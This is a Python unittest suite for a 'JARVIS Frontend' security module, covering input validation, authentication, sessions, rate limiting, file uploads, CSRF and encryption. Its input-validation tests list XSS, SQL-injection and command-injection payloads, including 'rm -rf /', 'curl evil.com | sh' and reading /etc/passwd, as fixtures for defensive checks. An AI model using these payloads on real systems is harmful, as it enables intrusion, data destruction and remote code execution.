"""
Security Testing Suite for JARVIS Frontend
Tests for vulnerability fixes and security controls
"""

import unittest
import sys
import os
sys.path.append(os.path.dirname(os.path.abspath(__file__)))

from security_remediation import (
    SecureAuthenticationManager,
    InputValidator,
    SecureSessionManager,
    RateLimiter,
    CSRFProtection,
    SecureFileHandler,
    DataEncryption
)

class TestInputValidation(unittest.TestCase):
    """Test input validation and sanitization"""
    
    def setUp(self):
        self.validator = InputValidator()
    
    def test_xss_prevention(self):
        """Test XSS attack prevention"""
        xss_payloads = [
            "<script>alert('XSS')</script>",
            "<img src=x onerror=alert('XSS')>",
            "javascript:alert('XSS')",
            "<iframe src='evil.com'></iframe>",
            "<svg onload=alert('XSS')>",
            "';alert('XSS');//",
            "<body onload=alert('XSS')>",
            "<%2Fscript%3E%3Cscript%3Ealert%28%27XSS%27%29%3C%2Fscript%3E"
        ]
        
        for payload in xss_payloads:
            is_valid, result = self.validator.validate_input(payload)
            # Should either reject or sanitize
            if is_valid:
                # Check that dangerous content is removed
                self.assertNotIn("<script", result.lower())
                self.assertNotIn("javascript:", result.lower())
                self.assertNotIn("onerror", result.lower())
                self.assertNotIn("<iframe", result.lower())
            else:
                # Correctly identified as dangerous
                self.assertIn("dangerous", result.lower())
    
    def test_sql_injection_prevention(self):
        """Test SQL injection prevention"""
        sql_payloads = [
            "'; DROP TABLE users; --",
            "1' OR '1'='1",
            "admin'--",
            "1' UNION SELECT * FROM users--",
            "'; EXEC xp_cmdshell('dir'); --"
        ]
        
        for payload in sql_payloads:
            sanitized = self.validator.validate_sql_input(payload)
            # Check dangerous SQL keywords are removed
            self.assertNotIn("'", sanitized)
            self.assertNotIn("--", sanitized)
            self.assertNotIn("xp_", sanitized)
    
    def test_command_injection_prevention(self):
        """Test command injection prevention"""
        cmd_payloads = [
            "; rm -rf /",
            "&& curl evil.com | sh",
            "`cat /etc/passwd`",
            "$(whoami)",
            "../../../etc/passwd"
        ]
        
        for payload in cmd_payloads:
            is_valid, result = self.validator.validate_input(payload)
            if not is_valid:
                self.assertIn("dangerous", result.lower())
    
    def test_html_sanitization(self):
        """Test HTML sanitization"""
        html_input = "<b>Bold</b> <script>alert('XSS')</script> <i>Italic</i>"
        sanitized = self.validator.sanitize_html(html_input)
        
        # Safe tags should remain
        self.assertIn("<b>", sanitized)
        self.assertIn("<i>", sanitized)
        
        # Dangerous tags should be removed
        self.assertNotIn("<script", sanitized)
        self.assertNotIn("alert", sanitized)
    
    def test_input_length_validation(self):
        """Test input length limits"""
        long_input = "A" * 10000
        is_valid, result = self.validator.validate_input(long_input, max_length=5000)
        self.assertFalse(is_valid)
        self.assertIn("exceeds maximum length", result)


class TestAuthentication(unittest.TestCase):
    """Test authentication and authorization"""
    
    def setUp(self):
        self.auth = SecureAuthenticationManager()
    
    def test_password_hashing(self):
        """Test secure password hashing"""
        password = "SecurePassword123!"
        hashed = self.auth.hash_password(password)
        
        # Hash should not be the original password
        self.assertNotEqual(password, hashed)
        
        # Should be able to verify
        self.assertTrue(self.auth.verify_password(password, hashed))
        
        # Wrong password should fail
        self.assertFalse(self.auth.verify_password("WrongPassword", hashed))
        
        # Hash should be different each time (salt)
        hashed2 = self.auth.hash_password(password)
        self.assertNotEqual(hashed, hashed2)
    
    def test_jwt_token_creation(self):
        """Test JWT token generation"""
        user_data = {"sub": "testuser", "role": "user"}
        token = self.auth.create_access_token(user_data)
        
        # Token should be created
        self.assertIsNotNone(token)
        self.assertIsInstance(token, str)
        
        # Should be able to decode
        decoded = self.auth.verify_token(token)
        self.assertIsNotNone(decoded)
        self.assertEqual(decoded["sub"], "testuser")
        self.assertEqual(decoded["role"], "user")
    
    def test_token_expiration(self):
        """Test token expiration"""
        from datetime import timedelta
        
        # Create token with very short expiration
        user_data = {"sub": "testuser"}
        token = self.auth.create_access_token(user_data, expires_delta=timedelta(seconds=-1))
        
        # Should fail to verify expired token
        decoded = self.auth.verify_token(token)
        self.assertIsNone(decoded)
    
    def test_2fa_generation(self):
        """Test 2FA secret generation and verification"""
        secret = self.auth.generate_2fa_secret()
        
        # Secret should be generated
        self.assertIsNotNone(secret)
        self.assertIsInstance(secret, str)
        self.assertTrue(len(secret) > 16)


class TestSessionManagement(unittest.TestCase):
    """Test secure session management"""
    
    def setUp(self):
        self.session_manager = SecureSessionManager()
    
    def test_session_creation(self):
        """Test session creation"""
        session_id = self.session_manager.create_session("testuser")
        
        # Session should be created
        self.assertIsNotNone(session_id)
        self.assertIsInstance(session_id, str)
        self.assertTrue(len(session_id) >= 32)
    
    def test_session_validation(self):
        """Test session validation"""
        session_id = self.session_manager.create_session("testuser")
        
        # Should validate successfully
        session_data = self.session_manager.validate_session(session_id, validate_csrf=False)
        self.assertIsNotNone(session_data)
        self.assertEqual(session_data["user_id"], "testuser")
    
    def test_csrf_validation(self):
        """Test CSRF token validation"""
        session_id = self.session_manager.create_session("testuser")
        session_data = self.session_manager.sessions[session_id]
        csrf_token = session_data["csrf_token"]
        
        # Should validate with correct CSRF token
        valid_session = self.session_manager.validate_session(session_id, True, csrf_token)
        self.assertIsNotNone(valid_session)
        
        # Should fail with wrong CSRF token
        invalid_session = self.session_manager.validate_session(session_id, True, "wrong_token")
        self.assertIsNone(invalid_session)
    
    def test_session_rotation(self):
        """Test session ID rotation"""
        old_session_id = self.session_manager.create_session("testuser")
        new_session_id = self.session_manager.rotate_session(old_session_id)
        
        # New session should be created
        self.assertIsNotNone(new_session_id)
        self.assertNotEqual(old_session_id, new_session_id)
        
        # Old session should be destroyed
        old_session_data = self.session_manager.validate_session(old_session_id, validate_csrf=False)
        self.assertIsNone(old_session_data)
        
        # New session should be valid
        new_session_data = self.session_manager.validate_session(new_session_id, validate_csrf=False)
        self.assertIsNotNone(new_session_data)


class TestRateLimiting(unittest.TestCase):
    """Test rate limiting functionality"""
    
    def setUp(self):
        self.rate_limiter = RateLimiter()
    
    def test_rate_limit_enforcement(self):
        """Test rate limit is enforced"""
        key = "test_user"
        
        # Should allow up to max_requests
        for i in range(5):
            self.assertTrue(self.rate_limiter.check_rate_limit(key, max_requests=5, window_seconds=60))
        
        # Should deny after limit
        self.assertFalse(self.rate_limiter.check_rate_limit(key, max_requests=5, window_seconds=60))
    
    def test_rate_limit_window(self):
        """Test rate limit window expiration"""
        import time
        
        key = "test_user_2"
        
        # Use up rate limit with very short window
        for i in range(3):
            self.assertTrue(self.rate_limiter.check_rate_limit(key, max_requests=3, window_seconds=1))
        
        # Should be denied immediately
        self.assertFalse(self.rate_limiter.check_rate_limit(key, max_requests=3, window_seconds=1))
        
        # Wait for window to expire
        time.sleep(1.1)
        
        # Should be allowed again
        self.assertTrue(self.rate_limiter.check_rate_limit(key, max_requests=3, window_seconds=1))
    
    def test_remaining_requests(self):
        """Test remaining requests calculation"""
        key = "test_user_3"
        
        # Should have full quota initially
        remaining = self.rate_limiter.get_remaining_requests(key, max_requests=10)
        self.assertEqual(remaining, 10)
        
        # Use some requests
        for i in range(3):
            self.rate_limiter.check_rate_limit(key, max_requests=10)
        
        # Should have correct remaining
        remaining = self.rate_limiter.get_remaining_requests(key, max_requests=10)
        self.assertEqual(remaining, 7)


class TestFileUploadSecurity(unittest.TestCase):
    """Test secure file upload handling"""
    
    def test_file_extension_validation(self):
        """Test file extension validation"""
        # Valid audio file
        is_valid, result = SecureFileHandler.validate_file(
            b"fake_audio_content",
            "audio.wav",
            allowed_extensions={'.wav'}
        )
        self.assertTrue(is_valid)
        
        # Invalid extension
        is_valid, result = SecureFileHandler.validate_file(
            b"fake_content",
            "malicious.exe",
            allowed_extensions={'.wav', '.mp3'}
        )
        self.assertFalse(is_valid)
        self.assertIn("not allowed", result)
    
    def test_file_size_validation(self):
        """Test file size limits"""
        large_file = b"X" * (11 * 1024 * 1024)  # 11MB
        
        is_valid, result = SecureFileHandler.validate_file(
            large_file,
            "large.wav",
            max_size=10 * 1024 * 1024  # 10MB limit
        )
        self.assertFalse(is_valid)
        self.assertIn("exceeds maximum size", result)
    
    def test_safe_filename_generation(self):
        """Test safe filename generation"""
        dangerous_name = "../../../etc/passwd.wav"
        safe_name = SecureFileHandler.generate_safe_filename(dangerous_name)
        
        # Should not contain path traversal
        self.assertNotIn("..", safe_name)
        self.assertNotIn("/", safe_name)
        
        # Should maintain extension
        self.assertTrue(safe_name.endswith(".wav"))
        
        # Should include timestamp and hash
        self.assertRegex(safe_name, r'\d{8}_\d{6}_.*_[a-f0-9]{8}\.wav')


class TestCSRFProtection(unittest.TestCase):
    """Test CSRF protection"""
    
    def test_csrf_token_generation(self):
        """Test CSRF token generation"""
        token1 = CSRFProtection.generate_csrf_token()
        token2 = CSRFProtection.generate_csrf_token()
        
        # Tokens should be generated
        self.assertIsNotNone(token1)
        self.assertIsNotNone(token2)
        
        # Tokens should be unique
        self.assertNotEqual(token1, token2)
        
        # Tokens should be sufficiently long
        self.assertTrue(len(token1) >= 32)
    
    def test_csrf_token_validation(self):
        """Test CSRF token validation"""
        token = CSRFProtection.generate_csrf_token()
        
        # Should validate correct token
        self.assertTrue(CSRFProtection.validate_csrf_token(token, token))
        
        # Should reject wrong token
        self.assertFalse(CSRFProtection.validate_csrf_token(token, "wrong_token"))
        
        # Should reject empty tokens
        self.assertFalse(CSRFProtection.validate_csrf_token("", ""))
        self.assertFalse(CSRFProtection.validate_csrf_token(token, ""))


class TestDataEncryption(unittest.TestCase):
    """Test data encryption"""
    
    def setUp(self):
        self.encryption = DataEncryption()
    
    def test_string_encryption(self):
        """Test string encryption and decryption"""
        original = "Sensitive data that needs encryption"
        
        # Encrypt
        encrypted = self.encryption.encrypt(original)
        self.assertNotEqual(original, encrypted)
        self.assertIsInstance(encrypted, str)
        
        # Decrypt
        decrypted = self.encryption.decrypt(encrypted)
        self.assertEqual(original, decrypted)
    
    def test_dict_encryption(self):
        """Test dictionary encryption"""
        original_dict = {
            "user": "testuser",
            "password": "secret",
            "data": [1, 2, 3]
        }
        
        # Encrypt
        encrypted = self.encryption.encrypt_dict(original_dict)
        self.assertIsInstance(encrypted, str)
        
        # Decrypt
        decrypted = self.encryption.decrypt_dict(encrypted)
        self.assertEqual(original_dict, decrypted)


class TestSecurityIntegration(unittest.TestCase):
    """Integration tests for security components"""
    
    def test_secure_login_flow(self):
        """Test complete secure login flow"""
        auth = SecureAuthenticationManager()
        session_manager = SecureSessionManager()
        rate_limiter = RateLimiter()
        
        # Simulate login attempt
        username = "testuser"
        password = "SecurePass123!"
        
        # Check rate limit
        self.assertTrue(rate_limiter.check_rate_limit(f"login:{username}", max_requests=5))
        
        # Hash password (would be stored in DB)
        password_hash = auth.hash_password(password)
        
        # Verify password
        self.assertTrue(auth.verify_password(password, password_hash))
        
        # Create session
        session_id = session_manager.create_session(username)
        
        # Create tokens
        access_token = auth.create_access_token({"sub": username})
        
        # Validate everything works
        self.assertIsNotNone(session_id)
        self.assertIsNotNone(access_token)
        
        # Verify token
        token_data = auth.verify_token(access_token)
        self.assertEqual(token_data["sub"], username)
        
        # Validate session
        session_data = session_manager.validate_session(session_id, validate_csrf=False)
        self.assertEqual(session_data["user_id"], username)


def run_security_tests():
    """Run all security tests"""
    # Create test suite
    loader = unittest.TestLoader()
    suite = unittest.TestSuite()
    
    # Add all test classes
    suite.addTests(loader.loadTestsFromTestCase(TestInputValidation))
    suite.addTests(loader.loadTestsFromTestCase(TestAuthentication))
    suite.addTests(loader.loadTestsFromTestCase(TestSessionManagement))
    suite.addTests(loader.loadTestsFromTestCase(TestRateLimiting))
    suite.addTests(loader.loadTestsFromTestCase(TestFileUploadSecurity))
    suite.addTests(loader.loadTestsFromTestCase(TestCSRFProtection))
    suite.addTests(loader.loadTestsFromTestCase(TestDataEncryption))
    suite.addTests(loader.loadTestsFromTestCase(TestSecurityIntegration))
    
    # Run tests
    runner = unittest.TextTestRunner(verbosity=2)
    result = runner.run(suite)
    
    # Print summary
    print("\n" + "=" * 70)
    print("SECURITY TEST SUMMARY")
    print("=" * 70)
    print(f"Tests run: {result.testsRun}")
    print(f"Failures: {len(result.failures)}")
    print(f"Errors: {len(result.errors)}")
    
    if result.wasSuccessful():
        print("\n✅ ALL SECURITY TESTS PASSED!")
    else:
        print("\n❌ SOME SECURITY TESTS FAILED!")
        print("Please review and fix the failures before deployment.")
    
    return result.wasSuccessful()


if __name__ == "__main__":
    success = run_security_tests()
    sys.exit(0 if success else 1)